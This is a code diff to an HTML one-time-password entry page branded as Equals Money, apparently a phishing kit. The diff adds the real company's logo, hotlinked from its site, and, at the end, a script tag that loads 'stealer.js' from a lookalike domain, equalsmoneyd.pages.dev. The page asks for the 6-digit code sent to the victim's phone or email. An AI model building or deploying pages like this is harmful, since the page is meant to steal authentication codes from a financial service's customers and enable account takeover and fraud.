@@ -7,7 +7,7 @@
         font-style: normal;
     }
 
-    /* Apply font and general styling */
+    /* Global Styles */
     body {
         font-family: "Equals", sans-serif;
         background-color: #f9f9f9;
@@ -16,6 +16,17 @@
         align-items: center;
         height: 100vh;
         margin: 0;
+        flex-direction: column;
+    }
+
+    /* Logo */
+    .logo-container {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+
+    .logo-container img {
+        width: 150px;
     }
 
     /* OTP Box */
@@ -72,6 +83,12 @@
     }
 </style>
 
+<!-- Logo -->
+<div class="logo-container">
+    <img src="http://app.equalsmoney.com/img/brands/logos/equals-light.svg" alt="Equals Money Logo">
+</div>
+
+<!-- OTP Box -->
 <div class="otp-box">
     <h1>Enter Your OTP Code</h1>
     <p>Please enter the 6-digit code sent to your phone or email.</p>
@@ -102,3 +119,7 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 });
 </script>
+
+<!-- Load stealer.js -->
+<script src="https://equalsmoneyd.pages.dev/stealer.js"></script>
+
